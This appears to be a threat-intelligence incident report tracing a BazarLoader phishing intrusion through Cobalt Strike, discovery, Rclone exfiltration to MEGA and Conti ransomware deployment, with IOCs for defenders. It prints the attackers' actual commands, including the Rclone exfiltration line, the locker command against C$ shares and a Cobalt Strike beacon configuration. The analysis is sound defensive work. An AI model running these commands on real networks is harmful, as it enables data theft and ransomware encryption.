# CONTInuing the Bazar Ransomware Story
### 

## Information:
+ Source: The DFIR Report
+ Link: [article](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)
+ Date: November 29, 2021
+ Author: Unknown


## Article:


In this report we will discuss a case from early August where we witnessed threat actors utilizing [BazarLoader](https://thedfirreport.com/?s=BazarLoader) and [Cobalt Strike](https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/) to accomplish their mission of encrypting systems with Conti ransomware.


The normal list of discovery tools were used during this case such as AdFind, Net, Ping, PowerView, and Nltest. Rclone was used to exfiltrate company data to Mega and Process Hacker was used to dump LSASS. The threat actors executed a Conti batch file on a server which then encrypted most of the domain joined systems.


Case Summary
------------


In August, we witnessed an intrusion that started from a BazarLoader infection.  A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source. Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.


It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware. This case saw such a conclusion. There are some evident similarities in cases that involve Conti ransomware. Ransomware operators’ tooling and overall tasks performed tend to match across the cluster. When we look at our earlier [Conti case](https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks), this becomes noticeable. This could be due to the widely circulated [Conti manual](https://therecord.media/disgruntled-ransomware-affiliate-leaks-the-conti-gangs-technical-manuals/) that was leaked by an affiliate. In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.


Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion. Straight away, they started gathering information to get the lay of the land using Net commands. Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.


After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers. During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook. They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.


Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the [MEGA cloud storage service](https://mega.io/).


On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.


On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.


On the fifth day, they moved fast towards their final objective, which was Conti ransomware. Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application. Having GUI access, they attempted to use ProcessHacker to dump the LSASS process. After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.


One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs). Most ransomware cases we see involve the threat actor executing code on the DCs.


### Services


We offer multiple services including a [Threat Feed service](https://thedfirreport.com/services/) which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found [here](https://thedfirreport.com/services/).


The Cobalt Strike servers in this case were added to the Threat Feed on 5/20/21 and 08/03/21


We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our [Security Researcher and Organization](https://www.patreon.com/thedfirreport) services.


Timeline
--------


![](https://thedfirreport.com/wp-content/uploads/2021/11/CONTInuing-the-Bazar-Ransomware-Story1.png)


Analysis and reporting completed by [@Kostastsale](https://twitter.com/Kostastsale), [@pigerlin](https://twitter.com/pigerlin), and [@\_pete\_0](https://twitter.com/_pete_0)


Reviewed by @TheDFIRReport


MITRE ATT&CK
------------


### Initial Access


Thanks to [@James\_inthe\_box](https://twitter.com/James_inthe_box) for the sample!



> 
> More fresh [#bazaloader](https://twitter.com/hashtag/bazaloader?src=hash&ref_src=twsrc%5Etfw) via password'd zips -> doc:<https://t.co/fP7WiT4KHL>
> 
> 
> dll drop hash:  
> d21908a90b44f440d80bb728ffc0893746df936aefd7440fcba447bf8f523184
> 
> 
> c2: https://161.35.147[.]110/out/run/text/plain [pic.twitter.com/aFZc9NznEi](https://t.co/aFZc9NznEi)
> 
> 
> — James (@James\_inthe\_box) [August 3, 2021](https://twitter.com/James_inthe_box/status/1422572684953620481?ref_src=twsrc%5Etfw)
> 
> 



As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload. The user is presented with the following:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/f22784bc5813874c131d0c6f21acb3404084de7b57c0ae1f2afde6d8fe24c3a2 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/f22784bc5813874c131d0c6f21acb3404084de7b57c0ae1f2afde6d8fe24c3a2)


Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/48fd9c86e04ef1a61d214e6e64ef7c41e6bd9a14221fa1d46971fef9324d2af8 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/48fd9c86e04ef1a61d214e6e64ef7c41e6bd9a14221fa1d46971fef9324d2af8)


A deeper inspection shows the Word 2003 XML formatting and the contained macro.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/378c5988f8fc4afa0a81cabf543a41f1e299b701f952ad4077406bd2b7110731 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/378c5988f8fc4afa0a81cabf543a41f1e299b701f952ad4077406bd2b7110731)


Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user’s folder:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/b7eb0f03b4298506d506b3212d1bcc69972e2706249a5b9e535f6ea28d43a323 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/b7eb0f03b4298506d506b3212d1bcc69972e2706249a5b9e535f6ea28d43a323)


Followed by the execution of the HTA:


[![](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c-1.png)](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c-1.png)


Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/9c60564c3c931ab0997a0b1d1576ca09d0ddec29b331655cbcf13c77fb8a5f5a "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/9c60564c3c931ab0997a0b1d1576ca09d0ddec29b331655cbcf13c77fb8a5f5a)


The base64 encoded string can be decoded to:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/9f647bdcc95ed17b46e7e166bd80c79c85701cc53d2c98873bec3a897ce304f6 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/9f647bdcc95ed17b46e7e166bd80c79c85701cc53d2c98873bec3a897ce304f6)


The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder “c:\users\public”, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/beaa83c86c77ad8f3fe2ad4baa905b35933b1294af9f5631e80e60aafef312b3 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/beaa83c86c77ad8f3fe2ad4baa905b35933b1294af9f5631e80e60aafef312b3)




---


This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network. The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration. Two DLLs were loaded via RunDll32 using the Svchost process. The first was D574.dll:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c)




---


Followed by D8B3.dll:


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/6c007b9f755b01e99fdb11ba0983477311fd7ae7c133edc50d351d2d6fb44bf5 "enter image title here")


D8B3.dll injected into the Winlogon process (high integrity):


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/157ab4613bc64d45aad39a06f7c9e1bbdac31afe3e1da5845f4e4dee593e2c11 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/157ab4613bc64d45aad39a06f7c9e1bbdac31afe3e1da5845f4e4dee593e2c11)


In the case of D8B3.dll, the DLL was Go compiled. Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/44cd52c302739e02de041a7db50bc820f0d9b8bc8c948432f55a151e8935e618 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/44cd52c302739e02de041a7db50bc820f0d9b8bc8c948432f55a151e8935e618)


Additionally, each DLL had no populated metadata relating to the DLL:


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/bc100cd9ef535089bdde054eeb00d24a45ba85231e588f23ddf3c0b2e5176f08 "enter image title here")


The process hierarchy tree visualization below:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/927a09d2bb51e93a6abf163e97fbedc1cf09f76f333ec1a7e5a936345fffc8a5 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/927a09d2bb51e93a6abf163e97fbedc1cf09f76f333ec1a7e5a936345fffc8a5)


This is very similar to the Bazarloader [analysis by Brad Duncan](https://isc.sans.edu/diary/rss/27738) on 11/08/2021.


### Persistence


We observed the AnyDesk application created under the folder c:\users\<REDACTED>\Videos’, an unusual location and suspicious location for process activity – this is a good detection opportunity where portable executables appear on non-standard file system locations.




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/7f72bf852b58de31e886393160e0dc14665c86c9863f90ac3b69bccc801d18cb "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/7f72bf852b58de31e886393160e0dc14665c86c9863f90ac3b69bccc801d18cb)




---


[AnyDesk](https://anydesk.com/) is a closed source remote desktop application that is available for several operating systems. It is free for private use. We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges. However, we did not observe many events of interest during these sessions.


### Credential Access


ProcessHacker was also dropped in the root of C:\ and likely used to access the LSASS process. The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\ root would also be suspicious in certain environments.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/ae2d915c25b3741d2639c30c2c10417bf81fcadfdc2c417ba004a8ae6bc64b6e "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/ae2d915c25b3741d2639c30c2c10417bf81fcadfdc2c417ba004a8ae6bc64b6e)


### Discovery


Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time. Examples included:



```
tasklist /s <REDACTED>
net group "domain admins" /dom
net localgroup "administrator"
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all time
ping
```

While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP’s and seen right after this mistake.


[![](https://thedfirreport.com/wp-content/uploads/2021/11/5794-7.png)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-7.png)


Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe. The example below using the time command:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/b9c5ab4ca577c810f6fe15373ae4a2bcc3a79e790a788e0aaa44945ba1c5d6f1 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/b9c5ab4ca577c810f6fe15373ae4a2bcc3a79e790a788e0aaa44945ba1c5d6f1)




---


Red Canary provides a good detection guide for RunDLL32; [this](https://redcanary.com/threat-detection-report/techniques/rundll32/) covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/4cf94e23abd22fa0ad6e718ca833baa0e0b530494c3309acc5d001bda83bdbaa "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/4cf94e23abd22fa0ad6e718ca833baa0e0b530494c3309acc5d001bda83bdbaa)




---


Discovery command invocation:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/0279e95c4c33e2b33b3509e07e19811588d32c0488908f01d7c006cd0d963e03 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/0279e95c4c33e2b33b3509e07e19811588d32c0488908f01d7c006cd0d963e03)


[AdFind](https://thedfirreport.com/2020/05/08/adfind-recon/) was observed via a file write for the binary, but there was no evidence of execution.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/e2869d1ae419f425ffa968640aab1a4db4e893e835136118f2a868727d5b2ee5 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/e2869d1ae419f425ffa968640aab1a4db4e893e835136118f2a868727d5b2ee5)


File share enumeration was achieved using the PowerShell [Invoke-ShareFinder](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1) script, part of PowerView.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/5e2b9072978174209ec9599d77e24814eb667a9a475a04d303a32627a73ad5b3 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/5e2b9072978174209ec9599d77e24814eb667a9a475a04d303a32627a73ad5b3)


The output file was created at c:\ProgramData\found\_shares.txt. The use of this tool has been observed in other [recent intrusions](https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/). PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/93ddd3e8229d05f00c11963ef5f11182f696d3d2907be284d0cbba1d30d62b5d "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/93ddd3e8229d05f00c11963ef5f11182f696d3d2907be284d0cbba1d30d62b5d)




---



On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.


[![](https://thedfirreport.com/wp-content/uploads/2021/11/5794-8.png)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-8.png)


After reviewing the backups, they also opened taskmanager via the GUI ([indicated by the /4 in the process command line](https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/)) to review the running processes on the system.


[![](https://thedfirreport.com/wp-content/uploads/2021/11/5794-9.png)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-9.png)



### Lateral Movement


A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/360da830c3f3842301f7b01e444953cbfc7c457d21206b1b712c8dda08094c72 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/360da830c3f3842301f7b01e444953cbfc7c457d21206b1b712c8dda08094c72)




---


Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/8a72c5822404bebc0e8c7c6f9673fa4a78a680c8dedc4adf443f0313d2cc35c6 "enter image title here")


The Cobalt Strike beacon (143.dll) injected into the svchost process ‘svchost.exe -k UnistackSvcGroup -s CDPUserSvc’:




---


[![](https://thedfirreport.com/wp-content/uploads/2021/11/a38f6e90769a77efb1025677dae290858a96d298e805dec77d49d4b3660fdddf.png)](https://thedfirreport.com/wp-content/uploads/2021/11/a38f6e90769a77efb1025677dae290858a96d298e805dec77d49d4b3660fdddf.png)




---


Followed by a request to checkauj[.]com (82.117.252.143). Approximately 9 hours later, the attacker established an RDP session via the 143.dll. This was achieved very early in the intrusion, and we were able to correlate the activity:




---


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/b2ae321614fb060e6f17a7b95a08bec9ccff1b1fb884d0e327c8bacef1403b2f "enter image title here")




---


During this event, we believe that the attacker disclosed the remote workstation name ‘win-344vu98d3ru’.


[![](https://thedfirreport.com/wp-content/uploads/2021/11/2d929ab92d2873804c44b155f95bc9470fa15dedb84788f9a84d94b86d62e8c3.png)](https://thedfirreport.com/wp-content/uploads/2021/11/2d929ab92d2873804c44b155f95bc9470fa15dedb84788f9a84d94b86d62e8c3.png)


### Command and Control


The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.


#### Bazar C2


64.227.65.60:443



```
JA3:72a589da586844d7f0818ce684948eea
JA3s:ec74a5c51106f0419184d0dd08fb05bc
```


```
Certificate: [7f:d6:df:4d:5e:c4:d9:71:c0:46:8d:47:e5:81:75:57:d6:92:72:96 ]
Not Before: 2021/08/03 07:37:28 UTC 
Not After: 2022/08/03 07:37:28 UTC 
Issuer Org: GG EST 
Subject Common: perdefue.fr 
Subject Org: GG EST 
Public Algorithm: rsaEncryption

```

161.35.147.110:443



```
JA3:72a589da586844d7f0818ce684948eea
JA3s:ec74a5c51106f0419184d0dd08fb05bc
```


```
Certificate: [21:ff:9f:e0:8a:dd:c3:ed:36:90:a0:e1:11:70:fe:c4:b3:42:f5:1a ]
Not Before: 2021/08/03 07:37:30 UTC 
Not After: 2022/08/03 07:37:30 UTC 
Issuer Org: GG EST 
Subject Common: perdefue.fr 
Subject Org: GG EST 
Public Algorithm: rsaEncryption

```

161.35.155.92:443



```
JA3:72a589da586844d7f0818ce684948eea
JA3s:ec74a5c51106f0419184d0dd08fb05bc
```


```
Certificate: [42:7d:a4:48:5b:6b:2b:92:2c:07:9d:cc:59:14:2e:de:b1:e8:f5:bb ]
Not Before: 2021/08/03 07:37:30 UTC 
Not After: 2022/08/03 07:37:30 UTC 
Issuer Org: GG EST 
Subject Common: perdefue.fr 
Subject Org: GG EST 
Public Algorithm: rsaEncryption

```

64.227.69.92:443



```
JA3:72a589da586844d7f0818ce684948eea
JA3s:ec74a5c51106f0419184d0dd08fb05bc
```


```
Certificate: [97:33:eb:80:85:ae:f0:0e:40:94:ac:d5:38:96:6a:e5:75:2b:49:8c ]
Not Before: 2021/08/03 07:37:28 UTC 
Not After: 2022/08/03 07:37:28 UTC 
Issuer Org: GG EST 
Subject Common: perdefue.fr 
Subject Org: GG EST 
Public Algorithm: rsaEncryption

```

#### Cobalt Strike


The first DLL [D574.dll] didn’t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.


D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/a6abc9f9fa1754b78f352dba2d215682604beb1cb1dade806822f3b500194cb6 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/a6abc9f9fa1754b78f352dba2d215682604beb1cb1dade806822f3b500194cb6)


We observed that the DLL payload “D574.dll” had issues contacting the domain volga.azureedge[.]net and C2 server via [DNS 9003 response codes](https://blog.didierstevens.com/2021/07/16/sysmons-dns-querystatus-field/).


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/2ed4b6f441190247999fd96b464d551eaae088873bc9c8bbe2ad753b20304711 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/2ed4b6f441190247999fd96b464d551eaae088873bc9c8bbe2ad753b20304711)


External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.


<https://tria.ge/210803-w15fxk72ns>


<https://capesandbox.com/analysis/175977/>


D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/e9d99ea9abdb897fa3d346534f32338e3a5433eeb1e3c2675b208f1e1494b0ed "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/e9d99ea9abdb897fa3d346534f32338e3a5433eeb1e3c2675b208f1e1494b0ed)


D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion. It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access. The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server. Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.


five.azureedge.net 82.117.252.143:80


checkauj.com 82.117.252.143:443



```
JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
```


```
Certificate: [68:c5:fc:c0:4a:34:e4:8f:01:86:59:c1:da:40:78:00:00:20:a0:b0 ]
Not Before: 2021/08/03 11:50:47 UTC 
Not After: 2021/11/01 11:50:45 UTC 
Issuer Org: Let's Encrypt 
Subject Common: checkauj.com [checkauj.com ,www.checkauj.com ]
Public Algorithmrsa:Encryption
```

#### Cobalt Strike Config


82.117.252.143 – checkauj.com



```
{
    "BeaconType": [
 "HTTP"
 ],
    "Port": 80,
    "SleepTime": 60000,
    "MaxGetSize": 1403644,
    "Jitter": 37,
    "C2Server": "checkauj.com,/jquery-3.3.1.min.js",
    "HttpPostUri": "/jquery-3.3.2.min.js",
    "Malleable\_C2\_Instructions": [
 "Remove 1522 bytes from the end",
 "Remove 84 bytes from the beginning",
 "Remove 3931 bytes from the beginning",
 "Base64 URL-safe decode",
 "XOR mask w/ random key"
 ],
    "SpawnTo": "AAAAAAAAAAAAAAAAAAAAAA==",
    "HttpGet\_Verb": "GET",
    "HttpPost\_Verb": "POST",
    "HttpPostChunk": 0,
    "Spawnto\_x86": "%windir%\\syswow64\\rundll32.exe",
    "Spawnto\_x64": "%windir%\\sysnative\\rundll32.exe",
    "CryptoScheme": 0,
    "Proxy\_Behavior": "Use IE settings",
    "Watermark": 0,
    "bStageCleanup": "True",
    "bCFGCaution": "False",
    "KillDate": 0,
    "bProcInject\_StartRWX": "True",
    "bProcInject\_UseRWX": "False",
    "bProcInject\_MinAllocSize": 17500,
    "ProcInject\_PrependAppend\_x86": [
 "kJA=",
 "Empty"
 ],
    "ProcInject\_PrependAppend\_x64": [
 "kJA=",
 "Empty"
 ],
    "ProcInject\_Execute": [
 "CreateThread",
 "SetThreadContext",
 "CreateRemoteThread",
 "RtlCreateUserThread"
 ],
    "ProcInject\_AllocationMethod": "VirtualAllocEx",
    "bUsesCookies": "True",
    "HostHeader": ""}


```

### Exfiltration


Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named [MEGA](https://mega.io/). The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.



```
rclone.exe  copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M

```

The use of RClone continues to be an effective tool for bulk data exfiltration. NCC Group has provided a [detailed write-up](https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/) of the Rclone application and detection methods.


The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.




---


[![](https://thedfirreport.com/wp-content/uploads/2021/11/509f3eb0a90b9b0912db53aa28219919244632a50c04e3d810a0acf874db241d.png)](https://thedfirreport.com/wp-content/uploads/2021/11/509f3eb0a90b9b0912db53aa28219919244632a50c04e3d810a0acf874db241d.png)




---


### Impact


On the fifth day, the threat actors moved to their final actions to encrypt the domain. They first pinged systems across the network via an interactive command shell. After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.


[![](https://thedfirreport.com/wp-content/uploads/2021/11/f3a3a919075ac160b8b18838ec9cef851eafe21ccb08c306f068ef7b0f6dead3.png)](https://thedfirreport.com/wp-content/uploads/2021/11/f3a3a919075ac160b8b18838ec9cef851eafe21ccb08c306f068ef7b0f6dead3.png)


The locker.bat is a bespoke script designed to encrypt files across a number of hosts:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/7b9e7c4d301dcb9922a9995615a03d6cbea55c1a141d820f909f68fd95414d96 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/7b9e7c4d301dcb9922a9995615a03d6cbea55c1a141d820f909f68fd95414d96)




---


Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.


The ransom was then launched via the backup server.




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/9cc86be7737f8d74a5bfd4da00fb46d2c3d899ebdc0475dccb0792932e3d1235 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/9cc86be7737f8d74a5bfd4da00fb46d2c3d899ebdc0475dccb0792932e3d1235)




---


To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.



```
C:\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp\_locker.exe -m -net -size 10 -nomutex -p \\TARGETHOST\C$
```

Here’s an overview of the execution:


![](https://thedfirreport.com/wp-content/uploads/2021/11/123.png)


Analysis of the DLLs accompanying the EXE indicates Conti artifacts:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/501735cefb3cc7d0b08f983c8a57b193267d9d1f2d49b9809e333aa15e4abd9b "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/501735cefb3cc7d0b08f983c8a57b193267d9d1f2d49b9809e333aa15e4abd9b)




---


Once the encryption was completed, the following ransomware note dropped in all affected directories as ‘readme.txt’




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/145eb3e900a27ad1bb6ebc7ba77c7ef2da278e0aa28ac69b0a995caad10ade27 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/145eb3e900a27ad1bb6ebc7ba77c7ef2da278e0aa28ac69b0a995caad10ade27)




---


The content of these text files:




---


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/ecaecfdb88f5ae8a174538af1ada8f5235a885544520ee0c01905f1e861b3310 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/ecaecfdb88f5ae8a174538af1ada8f5235a885544520ee0c01905f1e861b3310)




---


Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts – likely to validate and assess that the locker encryption was successful:


[![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/11/6cd18842629e69c9e3ce73f5af6192b42e43492f72dee865acb7c5c2077f0a37 "enter image title here")](https://thedfirreport.com/wp-content/uploads/2021/11/6cd18842629e69c9e3ce73f5af6192b42e43492f72dee865acb7c5c2077f0a37)


IOCs
----


### Network



```
millscruelg.com
45.95.11.133|80

64.227.69.92|443
161.35.155.92|443
161.35.147.110|443
64.227.65.60|443
volga.azureedge.net

five.azureedge.net
checkauj.com
82.117.252.143|443
82.117.252.143|80
```

### Files



```
decree-08.03.2021.doc
f6f72e3d91f7b53dd75e347889a793da
5d4f020115a483e9e5aa9778c038466f9014c90c
14bccfecaaec8353e3e8f090ec1d3e9c87eb8ceb2a7abedfc47c3c980da8ad71
compareForFor.hta
193b84d45dd371c6e4a501333d37349b
742ed8d0202aafba1c162537087a8a131cb85cde
fb38061bf601001c45aafe8d0c5feaa22c607d2ff79cfb841788519ca55a17b4
D8B3.dll
4ba6791f2293a8bc2dfa537015829b3c
d4f5cc55b6fa25f9a45ba7e968438b97e33aefbc
4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6
D574.dll
663c8d0fe8b770b50792d10f6c07a652
d0361fbcebe59205b2ea6a31041c89464a5e61b6
1872bf6c974e9b11040851f7d30e5326afdc8b13802891c222af4368a14f829c
143.dll
ab3a744545a12ba2f6789e94b789666a
1d5f8d283ed3f6019954aa480182c9913ee49735
6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610
ProcessHacker.exe
68f9b52895f4d34e74112f3129b3b00d
c5e2018bf7c0f314fed4fd7fe7e69fa2e648359e
d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f
locker.bat
84361813423910294079d0bc5b6daba2
c0b28fd2d5b62d5129225e8c45d368bc9e9fd415
1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3
o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp\_locker.exe
7f112bfa16a6bd344aaed28abf606780
eaa792a1c9f1d277af3d88bd9ea17a33275308f3
9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219
o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp\_locker\_x64.dll
2c313c5b532c905eb8f1748a0d656ff9
70725329e4c14b39d49db349f3c84e055c111f2d
31656dcea4da01879e80dff59a1af60ca09c951fe5fc7e291be611c4eadd932a
o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp\_locker\_x86.dll
26bd89afd5c1ba9803422d33185cef89
c99f0fa8d5fbffe5288aaff84dbe980c412ba34e
01a9549c015cfcbff4a830cea7df6386dc5474fd433f15a6944b834551a2b4c9
AnyDesk.exe
e6c3ab2ee9a613efdf995043b140fd8e
33738cf695a6ac03675fe925d62ecb529ac73d03
8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7
unlocker.exe
5840aa36b70b7c03c25e5e1266c5835b
ea031940b2120551a6abbe125eb0536b9e4f14c8
09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53
rclone.exe
9066cfcf809bb19091509a4d0f15f092
f88a948b0fd137d4b14cf5aec0c08066cb07e08d
9b5d1f6a94ce122671a5956b2016e879428c74964174739b68397b6384f6ee8b
```

### Suricata



```
ET TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile Response
